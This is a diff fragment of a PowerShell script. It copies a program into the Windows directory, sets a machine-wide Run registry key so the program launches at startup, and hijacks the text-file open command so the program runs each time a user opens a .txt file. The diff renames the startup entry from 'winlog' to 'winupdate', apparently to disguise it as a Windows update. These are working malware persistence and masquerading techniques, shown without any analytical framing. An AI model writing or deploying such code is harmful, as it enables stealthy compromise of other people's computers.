@@ -20,7 +20,7 @@ If (test-path "$WINDIR\$strFileName") {Remove-Item "$WINDIR\$strFileName" -Force
 Copy-Item $strFileName $WINDIR -Force
 
 # make program run at startup
-New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $WINDIR\$strFileName -Force
+New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value $WINDIR\$strFileName -Force
 
 # make program open anytime a user opens a text file
 New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$WINDIR\$strFileName %1" -Force
